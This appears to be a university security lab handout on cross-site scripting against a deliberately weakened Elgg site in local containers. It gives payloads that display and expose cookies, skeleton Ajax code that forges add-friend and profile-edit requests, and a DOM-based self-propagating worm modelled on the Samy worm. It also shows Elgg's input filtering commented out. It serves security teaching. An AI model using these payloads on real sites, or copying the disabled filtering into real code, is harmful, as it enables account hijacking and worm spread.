# Cross-Site Scripting (XSS) Attack Lab

Please download Labsetup.zip from <https://seedsecuritylabs.org/Labs_20.04/Files/Web_XSS_Elgg/Labsetup.zip>

## Overview

Cross-site scripting (XSS) is a type of vulnerability commonly found in web applications. This vulnerability makes it possible for attackers to inject malicious code (e.g. JavaScript programs) into victim's web browser. Using this malicious code, attackers can steal a victim's credentials, such as session cookies. The access control policies (i.e., the same origin policy) employed by browsers to protect those credentials can be bypassed by exploiting XSS vulnerabilities.

To demonstrate what attackers can do by exploiting XSS vulnerabilities, we have set up a web application named `Elgg` in our pre-built Ubuntu VM image. `Elgg` is a very popular open-source web application for social network, and it has implemented a number of countermeasures to remedy the XSS threat. To demonstrate how XSS attacks work, we have commented out these countermeasures in Elgg in our installation, intentionally making Elgg vulnerable to XSS attacks. Without the countermeasures, users can post any arbitrary message, including JavaScript programs, to the user profiles.

In this lab, students need to exploit this vulnerability to launch an XSS attack on the modified `Elgg`, in a way that is similar to what Samy Kamkar did to `MySpace` in 2005 through the notorious Samy worm. The ultimate goal of this attack is to spread an XSS worm among the users, such that whoever views an infected user profile will be infected, and whoever is infected will add you (i.e., the attacker) to his/her friend list. This lab covers the following topics:

- Cross-Site Scripting attack

- XSS worm and self-propagation

- Session cookies

- HTTP GET and POST requests

- JavaScript and Ajax

- Content Security Policy (CSP)

## Lab Environment Setup

### DNS Setup

We have set up several websites for this lab. They are hosted by the container `10.9.0.5`. We need to map the names of the web server to this IP address. Please add the following entries to `/etc/hosts`. You need to use the root privilege to modify this file:

```plaintext
10.9.0.5        www.seed-server.com
```

## Elgg Container

We use an open-source web application called `Elgg` in this lab. `Elgg` is a web-based social-networking application. It is already set up in the provided container images; its URL is `http://www.seed-server.com`. We use two containers, one running the web server (`10.9.0.5`) , and the other running the MySQL database (`10.9.0.6`). The IP addresses for these two containers are hardcoded in various places in the configuration, so please do not change them from the `docker-compose.yml` file.

## Lab Tasks

When you copy and paste code, the quotation marks, especially single quote, may turn into a different symbol that looks similar. They will cause errors in the code, so keep that in mind. When that happens, delete them, and manually type those symbols.

### Preparation: Getting Familiar with the `"HTTP Header Live"` tool

In this lab, we need to construct HTTP requests. To figure out what an acceptable HTTP request in Elgg looks like, we need to be able to capture and analyze HTTP requests. We can use a Firefox add-on called `"HTTP Header Live"` for this purpose. Before you start working on this lab, you should get familiar with this tool.

### Task 1: Posting a Malicious Message to Display an Alert Window

The objective of this task is to embed a JavaScript program in your `Elgg` profile, such that when another user views your profile, the JavaScript program will be executed and an alert window will be displayed. The following JavaScript program will display an alert window:

```html
<script type="text/javascript">
    alert("XSS");
</script>
```

If you embed the above JavaScript code in your profile (e.g. in the brief description field), then any user who views your profile will see the alert window.

In this case, the JavaScript code is short enough to be typed into the short description field. If you want to run a long JavaScript, but you are limited by the number of characters you can type in the form, you can store the JavaScript program in a standalone file, save it with the .js extension, and then refer to it using the `src` attribute in the `<script>` tag. See the following example:

```html
<script type="text/javascript">
    // src is used to specifies the URL of an external script file
    src="http://www.example.com/myscripts.js"> 
</script>
```

In the above example, the page will fetch the JavaScript program from `http://www.example.com`, which can be any web server.

## Task 2: Posting a Malicious Message to Display Cookies

The objective of this task is to embed a JavaScript program in your `Elgg` profile, such that when another user views your profile, the user's cookies will be displayed in the alert window. This can be done by adding some additional code to the JavaScript program in the previous task:

```html
<script type="text/javascript">
    var cookie = document.cookie;
    alert(cookie);
</script>
```

## Task 3: Becoming the Victim's Friend

In this and next task, we will perform an attack similar to what Samy did to MySpace in 2005 (i.e. the Samy Worm). We will write an XSS worm that adds Samy as a friend to any other user that visits Samy's page. This worm does not self-propagate; in task 5, we will make it self-propagating.

In this task, we need to write a malicious JavaScript program that forges HTTP requests directly from the victim's browser, without the intervention of the attacker. The objective of the attack is to add Samy as a friend to the victim. We have already created a user called Samy on the `Elgg` server (the user name is `samy`).

To add a friend for the victim, we should first find out how a legitimate user adds a friend in `Elgg`. More specifically, we need to figure out what are sent to the server when a user adds a friend. Firefox's `HTTP Header Live` inspection tool can help us get the information. It can display the contents of any HTTP request message sent from the browser. From the contents, we can identify all the parameters in the request. Once we understand what the add-friend HTTP request look like, we can write a JavaScript program to send out the same HTTP request. We provide a skeleton JavaScript code that aids in completing the task.

```html
<script type="text/javascript">
    window.onload = function () {
        // Set the timestamp and secret token parameters
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;

        //Construct the HTTP request to add Samy as a friend.
        var attackerGuid=...;   //FILL IN
        var sendurl=...;    //FILL IN

        //Create and send Ajax request to modify profile
        if(elgg.session.user.guid!=attackerGuid){
            var Ajax=new XMLHttpRequest();
            Ajax.open("GET", sendurl, true);
            Ajax.setRequestHeader("Host", "www.seed-server.com");
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send();
        }
    }
</script>
```

Refer to [Asynchronous JavaScript And XML](https://www.w3schools.com/js/js_ajax_intro.asp) (AJAX) for usage of AJAX. AJAX allows web pages to be updated asynchronously by exchanging data with a web server behind the scenes. This means that it is possible to update parts of a web page, without reloading the whole page.

The above code should be placed in the `"About Me"` field of Samy's profile page. This field provides two editing modes: Editor mode (default) and Text mode. The Editor mode adds extra HTML code to the text typed into the field, while the Text mode does not. Since we do not want any extra code added to our attacking code, the Text mode should be enabled before entering the above JavaScript code. This can be done by clicking on `"Edit HTML"`, which can be found at the top right of the `"About Me"` text field.

**Question.** If the `Elgg` application only provide the Editor mode for the `"About Me"` field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?

## Task 4: Modifying the Victim's Profile

The objective of this task is to modify the victim's profile when the victim visits Samy's page. Specifically, modify the victim's `"About Me"` field. We will write an XSS worm to complete the task. This worm does not self-propagate; in task 5, we will make it self-propagating.

Similar to the previous task, we need to write a malicious JavaScript program that forges HTTP requests directly from the victim's browser, without the intervention of the attacker. To modify profile, we should first find out how a legitimate user edits or modifies his/her profile in `Elgg`. More specifically, we need to figure out how the HTTP POST request is constructed to modify a user's profile. We will use Firefox's `HTTP Header Live` inspection tool. Once we understand how the modify-profile HTTP POST request looks like, we can write a JavaScript program to send out the same HTTP request. We provide a skeleton JavaScript code that aids in completing the task.

```html
<script type="text/javascript">
    window.onload = function(){
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts and Security Token __elgg_token
        var userName="&name="+elgg.session.user.name;
        var guid="&guid="+elgg.session.user.guid;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;

        //Construct the content of your url.
        var attackerGuid=...;   //FILL IN
        var sendurl=...;    //FILL IN
        var content=...;    //FILL IN

        //Create and send Ajax request to modify profile
        if(elgg.session.user.guid!=attackerGuid){
            var Ajax=new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Host", "www.seed-server.com");
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
    }
</script>
```

Similar to Task 3, the above code should be placed in the `"About Me"` field of Samy's profile page, and the Text mode should be enabled before entering the above JavaScript code.

## Task 5: Writing a Self-Propagating XSS Worm

To become a real worm, the malicious JavaScript program should be able to propagate itself. Namely, whenever some people view an infected profile, not only will their profiles be modified, the worm will also be propagated to their profiles, further affecting others who view these newly infected profiles. This way, the more people view the infected profiles, the faster the worm can propagate. This is exactly the same mechanism used by the Samy Worm: within just 20 hours of its October 4, 2005 release, over one million users were affected, making Samy one of the fastest spreading viruses of all time. The JavaScript code that can achieve this is called a **self-propagating cross-site scripting worm**. In this task, you need to implement such a worm, which not only modifies the victim's profile and adds the user "Samy" as a friend, but also add a copy of the worm itself to the victim's profile, so the victim is turned into an attacker.

To achieve self-propagation, when the malicious JavaScript modifies the victim's profile, it should copy itself to the victim's profile. There are several approaches to achieve this, and we will discuss two common approaches.

### Link Approach

If the worm is included using the `src` attribute in the `<script>` tag,
writing self-propagating worms is much easier. We have discussed the
`src` attribute in Task 1, and an example is given below. The worm can
simply copy the following `<script>` tag to the victim's profile,
essentially infecting the profile with the same worm.

```html
<script type="text/javascript">
    src="http://www.example.com/xss_worm.js">
</script>
```

### DOM Approach

If the entire JavaScript program (i.e., the worm) is embedded in the infected profile, to propagate the worm to another profile, the worm code can use DOM APIs to retrieve a copy of itself from the web page. An example of using DOM APIs is given below. This code gets a copy of itself, and displays it in an alert window:

```html
<script type="text/javascript" id="worm">
    var headerTag = "<script type=\"text/javascript\" id=\"worm\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>";

    // Put all the pieces together, and apply the URI encoding
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

    ...
</script>
```

It should be noted that `innerHTML` only gives us the inside part of the code, not including the surrounding `script` tags. We just need to add the beginning tag `<script id="worm">` (line ) and the ending tag `</script>` (line ) to form an identical copy of the malicious code.

When data are sent in HTTP POST requests with the `Content-Type` set to `application/x-www- form-urlencoded`, which is the type used in our code, the data should also be encoded. The encoding scheme is called _URL encoding_, which replaces non-alphanumeric characters in the data with `%HH`, a percentage sign and two hexadecimal digits representing the ASCII code of the character. The `encodeURICom ponent()` function in line is used to URL-encode a string.

## Elgg's Countermeasures

This sub-section is only for information, and there is no specific task to do. It shows how Elgg defends against the XSS attack. Elgg does have built-in countermeasures, and we have disabled them to make the attack work. Actually, Elgg uses two countermeasures. One is a custom built security plugin `HTMLawed`, which validates the user input and removes the tags from the input. We have commented out the invocation of the plugin inside the `filter_tags()` function in `input.php`. See the following:

```js
function filter_tags($var) {
    // return elgg_trigger_plugin_hook('validate', 'input', null, $var);
    return $var;
}
```

In addition to `HTMLawed`, Elgg also uses PHP's built-in method `htmlspecialchars()` to encode the special characters in user input, such as encoding `"<"` to `"&lt"`, `">"` to `"&gt"`, etc. This method is invoked in `dropdown.php`, `text.php`, and `url.php` inside the folder. We have commented them out to turn off the countermeasure.
